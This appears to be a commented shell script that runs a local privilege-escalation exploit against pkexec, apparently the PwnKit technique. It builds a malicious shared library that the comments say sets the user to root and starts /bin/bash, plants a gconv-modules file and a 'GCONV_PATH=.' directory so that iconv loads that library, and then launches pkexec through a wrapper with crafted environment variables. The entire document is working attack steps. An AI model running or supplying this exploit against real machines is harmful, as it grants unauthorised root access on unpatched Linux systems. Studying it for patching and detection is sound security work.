# Create a folder for iconv config and for evil-lib.so.
mkdir -p iconvdata

# Compile evil-lib.so – this is the library which will be loaded and executed by
# pkexec. Essentially it just set UID and GID to root (0) and run /bin/bash.
gcc --shared -o iconvdata/evil-lib.so evil-lib.c

# Create folder with  name "GCONV_PATH=.".
mkdir -p GCONV_PATH=.

# We need to have an executable file located at "./GCONV_PATH=./iconvdata"
# to run the exploit. This file will be executed by pkexec, but it's not
# important what it will run. So, we copy /usr/bin/true which just exits
# with 0 code.
cp /usr/bin/true ./GCONV_PATH=./iconvdata

# Configure iconv to load evil-lib.so for EVIL-CHARSET-NAME.
echo "module INTERNAL EVIL-CHARSET-NAME// evil-lib 1" > ./iconvdata/gconv-modules

# Compile and run the wrapper. The wrapper sets environment variables and runs
# pkexec. The environment variables will be:
# 1. "iconvdata" – the folder name we created above.
# 2. "PATH=GCONV_PATH=.".
# 3. "SHELL=/not/important" – not used and can be anything.
# 4. "CHARSET=EVIL-CHARSET-NAME" – should be the same as in ./iconvdata/gconv-modules.
gcc -o pkexec-wrapper pkexec-wrapper.c
./pkexec-wrapper
